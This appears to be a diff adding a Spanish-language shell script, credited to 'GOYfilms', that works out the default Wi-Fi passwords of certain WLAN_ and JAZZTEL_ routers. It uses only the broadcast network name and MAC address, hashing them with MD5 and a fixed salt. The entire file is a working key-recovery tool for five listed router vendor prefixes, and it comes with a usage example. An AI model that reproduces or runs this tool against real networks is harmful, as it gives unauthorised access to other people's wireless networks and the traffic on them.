@@ -1,0 +1,89 @@
+#!/bin/sh
+#by GOYfilms
+
+#FUNCIONES
+
+tipo_1()
+{
+ESSID_NUM=`echo -n "$NOMBRE_AP" | tr 'a-z' 'A-Z' | cut -d_ -f2`
+BSSID=`echo -n "$MAC_AP" | tr 'a-z' 'A-Z' | tr -d :`
+BSSID_CUT=`echo -n "$BSSID" | cut -c-8`
+CLAVE=`echo -n bcgbghgg$BSSID_CUT$ESSID_NUM$BSSID | md5sum | cut -c-20`
+}
+
+tipo_2()
+{
+ESSID_NUM=`echo -n "$NOMBRE_AP" | tr 'A-Z' 'a-z' | cut -d_ -f2`
+BSSID_CUT=`echo -n "$MAC_AP" | tr 'A-Z' 'a-z' | tr -d : | cut -c-8`
+CLAVE=`echo -n $BSSID_CUT$ESSID_NUM | md5sum | tr 'a-z' 'A-Z' | cut -c-20`
+}
+
+mostrar_BSSID_soportadas()
+{
+echo "64:68:0C"
+echo "00:1D:20"
+echo "00:30:DA"
+echo "38:72:C0"
+echo "00:1F:A4"
+}
+
+#PROGRAMA PRINCIPAL
+
+NOMBRE_AP="$1"
+MAC_AP="$2"
+if [ $# -ne 2 ]
+then
+	echo
+	echo Script by GOYfilms
+	echo
+	echo BSSID soportadas:
+	echo
+	mostrar_BSSID_soportadas
+	echo
+	echo "uso: $0 <ESSID> <BSSID>"
+	echo
+	echo "   <ESSID> = Nombre de la red"
+	echo "   <BSSID> = MAC del AP"
+	echo
+	echo "Ejemplo: $0 WLAN_AB12 64:68:0C:12:34:56"
+	echo
+	exit 1
+fi
+BSSID_CARACTERES=`echo -n "$2" | wc -c`
+if [ "$BSSID_CARACTERES" != "17" ]
+then
+	echo
+	echo "Error en longitud de BSSID"
+	echo
+	exit 1
+fi
+ESSID_NOMBRE=`echo -n "$1" | tr 'a-z' 'A-Z' | cut -d_ -f1`
+if [ "$ESSID_NOMBRE" != "WLAN" ] && [ "$ESSID_NOMBRE" != "JAZZTEL" ]
+then
+	echo
+	echo "ESSID no válido"
+	echo
+	exit 1
+fi
+FABRICANTE=`echo -n "$2" | tr 'a-z' 'A-Z' | cut -c-8`
+case $FABRICANTE in
+	64:68:0C)
+		tipo_1;;
+	00:1D:20)
+		tipo_1;;
+	00:30:DA)
+		tipo_1;;
+	38:72:C0)
+		tipo_1;;
+	00:1F:A4)
+		tipo_2;;
+	*)
+		echo
+		echo "BSSID no soportado"
+		echo
+		exit 1;;
+esac
+
+echo -n $CLAVE
+echo
+exit 0
